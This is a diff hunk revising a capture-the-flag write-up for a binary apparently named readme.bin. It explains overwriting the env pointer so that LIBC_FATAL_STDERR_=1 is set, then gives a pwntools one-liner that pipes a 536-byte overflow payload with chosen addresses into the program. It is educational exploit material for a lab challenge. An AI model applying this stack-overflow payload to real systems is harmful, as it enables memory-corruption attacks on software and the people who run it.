@@ -199,7 +199,9 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 Aborted
 ```
 
-Because we are working with socket / pipe, we overwrite also the `env` address with our pointer. Note that this code does not work in gdb, because `\x00` terminates strings, so better approach would be to debug only using core dumps. `0x600d20` is the address of the second buffer, which is used when asking to overwrite the flag.
+Because we are working with socket / pipe, we overwrite also the `env` address with our pointer, to have defined `LIBC_FATAL_STDERR_=1`. 
+
+Note that this code does not work in gdb, because `\x00` terminates strings, so better approach would be to debug only using core dumps. `0x600d20` is the address of the second buffer, which is used as storage, when the application is asking to overwrite the flag in second question.
 
 ```
 $ python -c 'from pwn import *; print "A" * 536 + p64(0x400d20) + p64(0) + p64(0x600d20) + "\n" + "LIBC_FATAL_STDERR_=1\n" ' | ./readme.bin
